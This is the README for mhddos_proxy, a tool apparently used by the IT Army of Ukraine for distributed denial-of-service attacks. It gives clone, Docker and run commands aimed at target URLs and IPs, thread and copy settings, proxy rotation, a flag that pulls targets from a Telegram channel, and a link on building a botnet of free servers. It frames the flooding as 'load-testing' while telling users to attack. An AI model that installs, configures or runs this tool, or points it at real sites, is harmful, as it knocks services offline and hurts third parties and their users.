## IT Army of Ukraine Official Tool

### Use flag `--lang en` to enable English translation

- Built-in proxy server database with a wide range of IPs around the world
- Possibility to set a huge number of targets with automatic load balancing
- A variety of different load-testing methods
- Effective utilization of your resources due to the asynchronous architecture

### ⏱ Recent updates
- **22.06.2022** Performance improvements. The `--debug` option is deprecated to avoid negative impact on performance
- **10.06.2022** Introduced `--proxy` option for providing custom proxies directly from command args
- **08.06.2022** Added `--copies auto` option to set the value automatically based on the resources available

### 1. 💽 Installation

#### Extended instructions (UA only so far) - [click here](/docs/installation.md)

#### Python (if it doesn't work, try `python` or `python3.10` instead of `python3`)

Requires python >= 3.8 and git

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

#### Docker

Install and start Docker: https://docs.docker.com/desktop/#download-and-install

### 2. 🕹 Running

#### Python with automatic updates (if it doesn't work, try `python` or `python3.10` instead of `python3`)

    ./runner.sh python3 https://example.com tcp://198.18.0.123:5678

#### Python (manual updates required) (if it doesn't work, try `python` or `python3.10` instead of `python3`)

    python3 runner.py https://example.com tcp://198.18.0.123:5678

#### Docker (for Linux, add sudo in front of the command)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://example.com tcp://198.18.0.123:5678

### 3. 🛠 Options (check out more in the [CLI](#cli) section)

All options can be combined, you can specify them either before and after the list of targets

- Consider adding your IP/VPN to the attack (especially when running on dedicated server), add flag `--vpn`
- To use targets provided by IT Army of Ukraine (https://t.me/itarmyofukraine2022), add the `--itarmy` flag  
- Number of threads: `-t XXXX` - the default is 8000 (or 4000 if the machine has only one CPU).
- Number of copies: `--copies X` or `--copies auto` - in case you have 4+ CPU and stable network 100+ Mb/s

### 4. 📌 Help with finding new proxies for mhddos_proxy
The script itself and installation instructions are here: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 5. 🐳 Community (mostly in Ukrainian)
- [Create a botnet of 30+ free and standalone Linux servers](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [Detailed analysis of mhddos_proxy and installation instructions](docs/installation.md)
- [Analysis of mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Example of running via docker on OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)

### 6. CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--vpn]
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
     optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with targets list
      -t, --threads 8000     Number of threads (default is 8000 if CPU > 1, 4000 otherwise)
      --vpn                  Use both my IP and proxies. Optionally, specify a chance of using my IP (default is 2%)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
      --proxy [PROXY ...]    List of proxies to use, separated by spaces
      --http-methods GET     List of HTTP(L7) methods to use (default is GET).
      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
      --copies 1             Number of copies to run (default is 1). Use "auto" to set the value automatically
      --lang {en,ua}         Select language (default is ua)

### 7. Custom proxies

#### CLI

To specify custom proxy use `--proxy` option:

    python3 runner.py --proxy socks4://114.231.123.38:3065

Multiple proxies are allowed (space separated):

    python3 runner.py --proxy socks4://114.231.123.38:3065 socks5://114.231.123.38:1080

If the list of custom proxies gets too long, consider switching to file-based configuration (see the next section).

#### File format (any of the following):

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password

where `protocol` can be one of 3 options: `http`|`socks4`|`socks5`. 
If `protocol` is not specified, default value `http` is used.
For example, for a public `socks4` proxy the format will be fhe following:

    socks4://114.231.123.38:3065

and for the private `socks4` proxy format can be one of the following:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065

**URL of the remote file for Python and Docker**

    --proxies https://pastebin.com/raw/UkFWzLOt

where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies (each proxy should be on a new line)  

**Path for the local file for Python**  
  
Put the file in the folder with `runner.py` and add the following option to the command (replace `proxies.txt` with the name of your file)

    --proxies proxies.txt

where `proxies.txt` is your proxy list file (each proxy should be on a new line)
